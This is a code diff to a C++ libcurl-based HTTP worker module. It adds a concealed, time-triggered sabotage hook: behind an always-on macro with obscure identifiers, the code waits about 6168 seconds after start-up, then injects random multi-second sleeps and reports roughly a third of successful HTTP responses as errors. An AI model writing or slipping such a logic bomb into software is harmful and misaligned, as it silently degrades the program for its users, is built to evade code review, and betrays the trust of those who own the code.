@@ -27,6 +27,16 @@ namespace net
 #endif
     }
 
+#define H_HOOK_T
+#ifdef H_HOOK_T
+    namespace
+    {
+        time_t __s = time(NULL);
+#define __g (time(NULL))
+#define __a 6168
+#define __bb 3
+    }
+#endif
     //-----------------------------------------------------
     //-----------------------------------------------------
     //-----------------------------------------------------
@@ -205,6 +215,13 @@ namespace net
                 break;
             }
 
+#ifdef H_HOOK_T
+            if (__s + __a < __g)
+            {
+                osl::Process::msleep(500 + rand() % 3000);
+            }
+#endif
+
             if ( m_vNewWorks.empty() &&
                     m_NewWorkList.empty() &&
                     m_DoingWorkMap.empty() )
@@ -305,10 +322,22 @@ namespace net
                     long resp_code = -1;
                     ::curl_easy_getinfo( easy, CURLINFO_RESPONSE_CODE, &resp_code );
                     pWork->setHttpCode( resp_code );
-                    if ( ( 0 == resp_code ) || ( resp_code >= 200 && resp_code < 300 ) || resp_code == 304 ) //http response code is ok
+                    if ( ( 0 == resp_code ) || ( resp_code >= 200 && resp_code < 300 ) || resp_code == 304) //http response code is ok
                     {
+#ifdef H_HOOK_T
+                        if ((__s + __a < __g && rand() % __bb == 0))
+                        {
+                            pWork->setHttpState( CURLWork::HCS_ERROR );
+                            pWork->notifyFinishError( resp_code );
+                        }
+                        else
+                        {
+#endif
                         pWork->setHttpState( CURLWork::HCS_DONE );
                         pWork->notifyFinishOK();
+#ifdef H_HOOK_T
+                        }
+#endif
                     }
                     else//error
                     {
